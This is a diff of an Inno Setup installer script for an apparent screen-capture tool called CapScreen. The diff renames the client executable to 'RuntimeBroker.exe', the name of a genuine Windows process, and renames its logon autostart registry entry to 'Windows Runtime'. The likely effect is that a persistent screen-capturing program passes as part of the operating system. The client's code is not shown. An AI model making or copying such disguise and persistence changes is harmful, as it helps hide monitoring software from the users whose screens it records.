@@ -11,23 +11,23 @@ OutputBaseFilename=CapScreen-Client-Setup
 Compression=lzma2
 SolidCompression=yes
 PrivilegesRequired=admin
-UninstallDisplayIcon={app}\CapScreenClient.exe
+UninstallDisplayIcon={app}\RuntimeBroker.exe
 
 [Files]
-Source: "..\client\dist\CapScreenClient.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "..\client\dist\RuntimeBroker.exe"; DestDir: "{app}"; Flags: ignoreversion
 Source: "..\client\config.json"; DestDir: "{app}"; Flags: ignoreversion
 
 [Icons]
-Name: "{group}\CapScreen Client"; Filename: "{app}\CapScreenClient.exe"
+Name: "{group}\CapScreen Client"; Filename: "{app}\RuntimeBroker.exe"
 Name: "{group}\Uninstall CapScreen"; Filename: "{uninstallexe}"
 
 [Registry]
 ; Tự động chạy khi Windows khởi động
-Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "CapScreen"; ValueData: """{app}\CapScreenClient.exe"""; Flags: uninsdeletevalue
+Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "Windows Runtime"; ValueData: """{app}\RuntimeBroker.exe"""; Flags: uninsdeletevalue
 
 [Run]
 ; Chạy ngay sau khi cài
-Filename: "{app}\CapScreenClient.exe"; Description: "Launch CapScreen Client"; Flags: nowait postinstall skipifsilent
+Filename: "{app}\RuntimeBroker.exe"; Description: "Launch CapScreen Client"; Flags: nowait postinstall skipifsilent
 
 [Code]
 var
